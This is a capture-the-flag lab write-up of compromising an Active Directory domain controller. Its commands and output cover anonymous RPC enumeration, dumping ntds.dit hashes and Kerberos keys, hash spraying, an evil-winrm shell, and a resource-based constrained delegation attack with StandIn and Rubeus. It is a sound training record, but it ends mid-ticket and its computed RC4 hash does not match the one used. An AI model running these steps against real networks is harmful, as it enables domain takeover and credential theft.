# CTF Writeup: Resourced

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.248.175
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 16:32 EST
Nmap scan report for 192.168.248.175
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-12 21:32:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-11-12T21:33:38+00:00
|_ssl-date: 2025-11-12T21:34:18+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-11-11T21:31:31
|_Not valid after:  2026-05-13T21:31:31
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-12T21:33:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   178.81 ms 192.168.45.1
2   178.78 ms 192.168.45.254
3   178.89 ms 192.168.251.1
4   178.98 ms 192.168.248.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.43 seconds
```

The script revealed the domain of the system & the domaincontroller let's map both to our target ip in our local dns file.

```
sudo echo "192.168.248.175 ResourceDC.resourced.local resourced.pg" | sudo tee -a /etc/hosts
```

Tried enumerating shares anonymously, but this didn't seem to work.

Logged into rpcclient anonymously and checked and used following command to enumerate credentials V.Ventz:HotelCalifornia194!

```
rpcclient -U''%'' 192.168.248.175
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

Was able to enumerate shares with those credentials!

```
smbmap -H resourced.pg -u V.Ventz -p HotelCalifornia194!
[+] IP: 192.168.248.175:445     Name: resourced.pg              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Password Audit                                          READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
[\] Closing connections..                                                                                            [|] Closing connections..                                                                                            [/] Closing connections..                                                                                            [-] Closing connections..                                                                                            [*] Closed 1 connections
```

The SMB Share "Password Audit" looks very promising, let's analyze it!

Weirdly enough, it wouldn't let me connect to the normal smbclient.. so I utilized impacket-smbclient

```
impacket-smbclient V.Ventz:'HotelCalifornia194!'@resourced.pg
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# ls
[-] No share selected
# use Password Audit
# ls
drw-rw-rw-          0  Tue Oct  5 04:49:16 2021 .
drw-rw-rw-          0  Tue Oct  5 04:49:16 2021 ..
drw-rw-rw-          0  Tue Oct  5 04:49:15 2021 Active Directory
drw-rw-rw-          0  Tue Oct  5 04:49:16 2021 registry
#
```

Downloaded ntds.dit, ntds.jfm, SECURITY & SYSTEM files from the Share onto my local machine.

Those files are the goldmine of the Domain Controller, we can try and dump those files to check if we can retrieve user Hashes back.

I therefore decided to utilize secretsdump.py

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
[*] NL$KM 
 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.>.J......I.
 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```

This went quite productive. Let's prepare an list of all the users on the system & hashes! So we can spray the login with crackmapexec after to check which are usable!

1) Added all the users:hashes inside 1 file, to now filter them out with 1 command.

```
nano hashes
```

2) Created userlist.

```
cat hashes | cut -d ":" -f1 | tee users.txt
```

3) Created hash list.

```
cat hashes | cut -d ":" -f4 | tee hashes.txt
```

4) Performed password spraying utilizing crackmapexec and found valid login.

```
crackmapexec winrm 192.168.248.175 -u users.txt -H hashes.txt
WINRM       192.168.248.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

## Initial Access

Connected to the server utilizing evil-winrm

```
evil-winrm -i 192.168.246.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                          
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents>
```

Retrieved local.txt in C:\Users\L.Livingstone\Desktop

```
699614d25e72f128685241be6044e33e
```

Since we can't authenticate using bloodhound-python, we will have to perform internal domain enumeration utilizing SharpHound.exe, therefore let's upload it. Let's utilize the inbound "upload" functionality of evil-winrm.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload /usr/share/sharphound/SharpHound.exe SharpHound.exe
                                        
Info: Uploading /usr/share/sharphound/SharpHound.exe to C:\Users\L.Livingstone\Documents\SharpHound.exe
                                        
Data: 1753768 bytes of 1753768 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents>
```

Executing SharpHound.exe provides us with an .zip file in which all the user data is stored.

```
.\SharpHound.exe -c all, gpolocalgroup
```

Let's download it.

```
download 20251113040357_BloodHound.zip
```

Upload it onto our bloodhound panel (running on localhost:9090 for me)

Analyzing the path to the domain controller from our user L.Livingstone reveals that we have "GenericAll" to the dc.

We should be able to exploit "Resource-Based Constrained Delegation Attack".

Therefore we will need to download Rubeus.exe & StandIn.exe, download them to the target system.

Executing StandIn.exe will create an new computer account, it's important to save the password there aswell!

```
C:\Users\L.Livingstone\Documents> .\StandIn.exe --computer xct --make

[?] Using DC    : ResourceDC.resourced.local
    |_ Domain   : resourced.local
    |_ DN       : CN=xct,CN=Computers,DC=resourced,DC=local
    |_ Password : 6C9U6TrATJk1sSq

[+] Machine account added to AD..
```

We need to set an field in the next step so msds can act in our identity, in order to do this, we will need the SID of the created user account.

```
Get-ADComputer -Filter * | Select-Object Name, SID

Name       SID
----       ---
RESOURCEDC S-1-5-21-537427935-490066102-1511301751-1000
xct        S-1-5-21-537427935-490066102-1511301751-4101
```

So now we can utilize following command to set the attribute.

```
.\StandIn.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101

[?] Using DC : ResourceDC.resourced.local
[?] Object   : CN=RESOURCEDC
    Path     : LDAP://CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity
```

The DC is now trusting this newly created account.

Now we can utilize Rubeus.exe in order to impersonate the Administrator Account & gain an TGT Ticket Hash.

Note: That Rubeus wants the RC4 Value, so we need to get the hash of the password of the user account we created, therefore we can use python3

Go on to your local machine & paste the following commands + ur password inside, in order to retrieve the hash value of the password.

```
python3
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib,binascii
>>> hash = hashlib.new('md4', "6C9U6TrATJk1sSq".encode('utf-16le')).digest()
>>> print(binascii.hexlify(hash))
b'21e6ed57cd347f8243ed5d9f10f1aa23'
```

Let's run Rubeus.exe now

```
.\Rubeus.exe s4u /user:xct /rc4:573ca5566cec9c0829992cdb8ce6abef /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: fe5602353f6dfafbf5492535956e374a
[*] Building AS-REQ (w/ preauth) for: 'resourced.local\xct'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE6jCCBOagAwIBBaEDAgEWooID+zCCA/dhggPzMIID76ADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIkMCKgAwIBAqEbMBkbBmtyYnRndBsPcmVzb3VyY2VkLmxvY2Fso4IDrTCCA6mgAwIBEqEDAgECooIDmwSCA5fj/d6tUMjUkJRJ1MetHUe5tFg6D51qYU8i2YKpawOm50bZySSJ6zRYudv1AMvA174HhoTKnJRzaf3mv3lMx8PJbHg5RjtcWMYvjtNTSuC+p7Wy14xDCn+PNPl3n03+jgLX5ZbP30ZMQTTGbc8zhiTe1rZzExybiUf6UP1appcbb/DP4UetjkvzkxkE0+0jB0QfcpHvo/EABLaCurmWZAaNM+vp6sZVtwvXrlS238B3rNUqrAi6NkI99ajy+2LH3+esQoYPjfjFrxK/yhGet+Y4/dZWTD+LTmMTpqG64vxbmZB9uFi1m/gFpsAMQmqaKbvNj9tnnnFkcF6/DKYe7kt9qs9S0sbkRL192+QsvgXASg9CSZjVh9+1JxE/rj5PWh1N64PhF+ji4lK76GacnQm2Ql2jRWNXAlGoN3PGTdaD1Hf4Sh2GurEdyJUGjg2F9XcM6Z/9Z4zm6IFx8+1yMI75WPLPenymCqkQYgOg2ngoh6KSgJUoSEXLXP47c54b+MvGPoKd4/TZz6nRWXGYZ6KGqaTdOZ3z1PySyrjUtNYhNaunO2g4tjihi+0PC5BzvOxXfy/CPelktCq9FVIWl08g8t7PrWrWzxn4gf0nHIb3T7VvMxZswoJVk4X46Uw+AcKa6SBADAab/SCrEAGNU5Tnz9gO5sEUqg++WMMbXxv496Ke9ptzTPhY3naFuFH0HXSXu1aExK1qwEvLop7Vz/q/seyTfQxUEf9aDCj7iATNcJ/6BbC97VLUll0eHEbgCJnFE0W9PQ97nK7kU3qpiE891j0pZKidVaIOx1bczpFUQhTjh87Y20/z15skCdebnWKUBO5R/MROdUzYKv9Df48xVc5gWE1zuilRFXA3owGARX5kUtzLvKfs7HG9VlkGYEpLFd6/uPPiqyP6cvlYCgPB//g07qv/ilaJKbPkBp5EVqVZ8cBPzMfXCZs2XRHvUSVFIN3muRoUhXkw21rTljqZ+wbvTgpng2rA9pS+Qo8YMosnwEmQci/5sF4X9IJH3Gygf0LSaNXmnJCA6667RVWzmjc+kZrrRr1bOfN4YrLB1IgerX3xgXW4hlS+KQGNq3c3xZQvZQ180WUURPAiwRyLDSG1y4xoNc2u+lUPXWgEkngfpEQ7KZOZy1/IzFaZEP/4oNAyhRmOk3Pkse3qGj/xTlT73dKzfzEnbvMgp3dDIqTRacsw/o1WJURa9SC3R4HcuprLONEIo4HaMIHXoAMCAQCigc8Egcx9gckwgcaggcMwgcAwgb2gGzAZoAMCARehEgQQJaSU8IxwgegA22WwUlckFKERGw9SRVNPVVJDRUQuTE9DQUyiEDAOoAMCAQGhBzAFGwN4Y3SjBwMFAEDhAAClERgPMjAyNTExMTMxNDEwMjlaphEYDzIwMjUxMTE0MDAxMDI5WqcRGA8yMDI1MTEyMDE0MTAyOVqoERsPUkVTT1VSQ0VELkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9yZXNvdXJjZWQubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'xct@RESOURCED.LOCAL'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'xct@RESOURCED.LOCAL'
[*] base64(ticket.kirbi):

      doIFijCCBYagAwIBBaEDAgEWooIEpTCCBKFhggSdMIIEmaADAgEFoREbD1JFU09VUkNFRC5MT0NBTKIQMA6gAwIBAaEHMAUbA3hjdKOCBGswggRnoAMCARehAwIBAaKCBFkEggRV0DsDeJyzZnFkG/f+hW5FyiCEUUbhZtCTDMVnQqLU7lEn98cWsq/AlHWghgCm+DMsyI5AGqrj9X3z3nZRQZOdIT9kkCHnkUC9eQcQ4abNvQM836ZxLkjaZslq39bAEM+zLB+YDMuxv63CqsXeaUyzVEF7kx79p6Pj3lz1+AI8Z1aRJ3BOEQEem9G4ZA88EFqc703wafT+5jwOHtkZH8UXRIFC5lvrj5X8velVV36c+AGY3v9VpKw/SNjok4vHXZe/6Ej471yqfJvti99uYI+Hw3k2YtBHjv3KYW09G8NFV8jHTquynEmN5LBifZQok9UVLb0j+r/aCPGhpJ7hmUABx5h6jvtcUDtnf9CL9DmUvL4E4zZIAZ+oK1xqC5KhmVZHtsKIkoXP4ptEaHQpH7QJJhbEWGifiVxZol4+lhJltqEO5+nfBBJzFd8Pm0u5P7qH4H4XdOfo8dcbDGrJLuBGGRo5WZ7NniF0f9mXgdnh6CG8fV/UeB0sgygOib1ka9QoJ1c/NmDOBONDDTZHZx70kb3wdpfXoW0oDNKPB4RLJusCy46skdjsAgAWCRxUikLnkrBWNo7D7S/05R34cSLO9628RvsaPwxkgYIM8XuI8j/PvNGCvAomk9R3UhTBtndS1r18bW3oOhCnBZK16uvl6r2FhdnMEcISTDDl8o+Y8NMfHFsN+wZXt7W5R6fuBKT4DCpJFcNiYvjguURc/TZp/OZeBUW3/Htw98JMhabCFfSj7e8jru5UwJnYzQcKcpD3uVcQk3qdVNx62a1YnR62big16p376t6Foc0vJPzq78RZ+2Yq4Aa4zFLiIAGyPkKiCPjcgBq6D2Oa5QUjIqKIIRCq/oh04D/S0Z8uTk1tdhgYK73VFcY8/ajaPTib1kEwQtPb7igg8yhGHcWRRsu2QF/oG72cm2iW02li6mYa/iq71q5u7k1c4Dx6SVYJr56beH2vI3ZTS6bKr9htEtOIjbp/YT+DEUi1YNnnwwBE0TRUBYp2I0fpfAvrYRLrbz6AnhNRxSM3PWZA5b1Xosy1XuZsEKk6PfbTsHm6U+veBgsNG6yEeNdkig3fUzfsRKF0Q7Xl1V5NFYis2cCMihCZW9/cAHiEmhcuZNkUqw1HW3ighBkyUniFmCqeY1yhMa6k6tSQgX8rHcLna6H+ESjcVLuMUQLt7aOegvGaSgRTEwWXMqnbkom25/PULEG9r3N2Hl4MWrvyXZc/CvWIGBg8UUTv4vEvnfrjcaj8SQYcvnEps6VqtH2130dqK6AZLamYDEdxDKUidNsXorUGh1jAfYEGmjvVgQI0PN9JHx7Pp0Jt6t8ftJPyO2QRswf8egDXZ9z/gwC0QRTQwd6h3sNd71DyOOkaeaEMJx3UtAMVTq/itDfhj2/JKpcpH9GwAAignzRmVoy+oVRe9lTywpaiUlyxkps3q/WqBg6ay1HuKys6eF11P51KfYrZDSSyTlnfH36liGmjgdAwgc2gAwIBAKKBxQSBwn2BvzCBvKCBuTCBtjCBs6AbMBmgAwIBF6ESBBA5+DszrE8kprCpGZbXYsPuoREbD1JFU09VUkNFRC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNTExMTMxNDEwMjlaphEYDzIwMjUxMTE0MDAxMDI5WqcRGA8yMDI1MTEyMDE0MTAyOVqoERsPUkVTT1VSQ0VELkxPQ0FMqRAwDqADAgEBoQcwBRsDeGN0

[*] Impersonating user 'administrator' to target SPN 'cifs/resourcedc.resourced.local'
[*] Building S4U2proxy request for service: 'cifs/resourcedc.resourced.local'
[*] Using domain controller: ResourceDC.resourced.local (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/resourcedc.resourced.local':

      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